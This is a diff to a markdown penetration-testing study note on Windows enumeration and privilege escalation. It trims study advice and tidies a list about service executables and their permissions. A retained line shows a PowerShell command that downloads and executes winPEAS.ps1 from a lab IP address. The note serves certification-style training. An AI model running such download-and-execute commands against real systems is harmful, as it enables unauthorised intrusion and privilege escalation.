@@ -284,18 +284,11 @@ BUILTIN\Users:(I)(RX)
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.79:8090/winPEASS.ps1')" > winpeas.txt
 ```
 
-Run this **after** manual enumeration — good for catching what you missed, but relying on it first skips the reasoning practice (useful for CJCA/GCIH/CPTS-style methodology building).
-
-**Suggested flow recap:** `whoami /priv` + `/groups` → user/group enum → system/OS enum → processes/tasks → scheduled tasks → network → execution policy → file permissions → WinPEAS as a final sweep.
-
 **Step 8 — Final Enumeration**
 Via `services.msc`, identify for each service:
-
 1. Service name
 2. Full path to the executable — **weak NTFS permissions on the destination directory let an attacker modify/replace the binary** 
-3. Startup type / account it runs as most run as `LocalSystem` 
-
-
+3. Startup type / account it runs as most run as `LocalSystem`  
 ---
 # Privilege Escalation Methods
 1. Make sure that you enumerated the entire system
